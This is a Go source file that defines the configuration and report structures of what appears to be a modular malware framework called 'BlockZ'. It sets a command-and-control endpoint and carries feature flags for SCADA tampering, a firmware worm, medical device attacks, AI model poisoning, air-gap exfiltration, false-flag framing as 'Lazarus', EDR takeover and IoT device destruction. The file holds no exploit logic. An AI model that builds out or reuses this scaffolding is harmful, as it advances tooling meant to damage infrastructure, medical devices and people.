package blockz

type BlockZConfig struct {
	Enabled     bool   `json:"enabled"`
	Simulation  bool   `json:"simulation"`
	C2Endpoint  string `json:"c2_endpoint"`
	DeadMansHours int  `json:"dead_mans_hours"`

	GeneticEvolution bool `json:"genetic_evolution"`
	DeepfakeEnable   bool `json:"deepfake_enable"`
	SCADACovert      bool `json:"scada_covert"`
	FirmwareWorm     bool `json:"firmware_worm"`
	MedicalAttack    bool `json:"medical_attack"`
	ModelPoisoning   bool `json:"model_poisoning"`
	Disinformation   bool `json:"disinformation"`
	AirGapJump       bool `json:"air_gap_jump"`
	PostQuantum      bool `json:"post_quantum"`
	DeadMansSwitch   bool `json:"dead_mans_switch"`
	FalseFlagFraming bool `json:"false_flag_framing"`
	EDRControl       bool `json:"edr_control"`
	FinancialAttack  bool `json:"financial_attack"`
	IoTPhysicalChain bool `json:"iot_physical_chain"`

	DeepfakeModelPath string `json:"deepfake_model_path"`
	KyberVariant      string `json:"kyber_variant"`
	UltrasoundFreq    int    `json:"ultrasound_freq"`
	LEDModFreq        int    `json:"led_mod_freq"`
	APTImpersonate    string `json:"apt_impersonate"`
	StockSymbol       string `json:"stock_symbol"`
}

func DefaultBlockZConfig() *BlockZConfig {
	return &BlockZConfig{
		Enabled:      true,
		Simulation:   true,
		C2Endpoint:   "x404x-c2.online:8443",
		DeadMansHours: 48,
		UltrasoundFreq: 22000,
		LEDModFreq:     300,
		KyberVariant:   "Kyber-1024",
		APTImpersonate: "Lazarus",
		StockSymbol:    "",
	}
}

type BlockZReport struct {
	GenerationCount    int     `json:"generation_count"`
	BestFitness        float64 `json:"best_fitness"`
	DeepfakesGenerated int     `json:"deepfakes_generated"`
	SCADAGradual       int     `json:"scada_gradual_changes"`
	FirmwareInfections int     `json:"firmware_infections"`
	MedicalExploits    int     `json:"medical_exploits"`
	ModelsPoisoned     int     `json:"models_poisoned"`
	DisinfoMessages    int     `json:"disinfo_messages"`
	AirGapExfilBytes   int     `json:"air_gap_exfil_bytes"`
	KyberKeysGenerated int     `json:"kyber_keys_generated"`
	DeadManArmed       bool    `json:"dead_man_armed"`
	FalseFlagsPlanted  int     `json:"false_flags_planted"`
	EDRSelfDeployCount int     `json:"edr_self_deploy_count"`
	FinancialPositions int     `json:"financial_positions"`
	IoTDevicesKilled   int     `json:"iot_devices_killed"`
	ModulesExecuted    int     `json:"modules_executed"`
	Success            bool    `json:"success"`
}
